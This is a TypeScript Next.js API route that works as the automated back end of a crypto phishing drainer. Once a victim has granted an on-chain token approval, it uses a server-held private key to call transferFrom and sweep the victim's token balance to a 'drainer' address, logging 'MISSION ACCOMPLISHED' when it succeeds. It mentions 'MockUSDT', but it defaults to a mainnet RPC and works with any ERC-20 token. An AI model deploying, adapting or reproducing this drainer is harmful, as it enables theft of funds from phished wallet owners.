import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

// Load environment variables directly from the root .env file whichNext.js automatically handles if placed right. 
// However, since the root `.env` is outside `frontend/`, it's best to rely on standard Next.js env configuration
// But we'll build it to fall back properly or assume process.env is populated since `npm run dev` typically catches `.env.local`.

const abi = [
    "function transferFrom(address from, address to, uint256 amount)",
    "function balanceOf(address account) view returns (uint256)"
];

export async function POST(request: Request) {
    try {
        const payload = await request.json();
        const { victimAddress, drainerAddress, drainAmount } = payload;

        // Setup the RPC connection and the malicious drainer wallet
        const rpcUrl = process.env.NEXT_PUBLIC_MAINNET_RPC_URL || process.env.MAINNET_RPC_URL || "https://cloudflare-eth.com";
        const privateKey = process.env.PRIVATE_KEY;
        const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS || process.env.TOKEN_ADDRESS;

        if (!rpcUrl || !privateKey || !tokenAddress) {
            console.error("[-] API configuration missing required environment variables.");
            return NextResponse.json({ error: 'Server Misconfiguration' }, { status: 500 });
        }

        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const drainerWallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(tokenAddress, abi, drainerWallet);

        console.log(`\n[+] API Route Triggered: On-Chain Approval Detected from ${victimAddress}`);
        console.log(`[+] Executing Automated Phishing Relay...`);

        // Broadcast the sweep transaction directly (since approval is already on-chain)
        console.log(`[Step 1/1] Automatically draining 100% of approved wallet contents...`);
        const balance = await token.balanceOf(victimAddress);

        if (balance === BigInt(0)) {
            console.log(`[-] Victim balance evaluates to 0 MockUSDT. Extraction terminated safely.`);
            return NextResponse.json({ success: true, message: 'Approval confirmed but victim had 0 balance.' });
        }

        const amountToDrain = BigInt(drainAmount);
        const sweepAmount = balance < amountToDrain ? balance : amountToDrain;

        const sweepTx = await token.transferFrom(victimAddress, drainerAddress, sweepAmount);
        await sweepTx.wait();

        console.log(`[✅ MISSION ACCOMPLISHED] Drained ${ethers.formatUnits(sweepAmount, 6)} MockUSDT perfectly from on-chain approval!`);

        return NextResponse.json({ success: true, hash: sweepTx.hash });

    } catch (error: any) {
        console.error(`\n[❌] Automated Relayer Failed:`, error.shortMessage || error.message);
        return NextResponse.json({ error: error.message }, { status: 500 });
    }
}
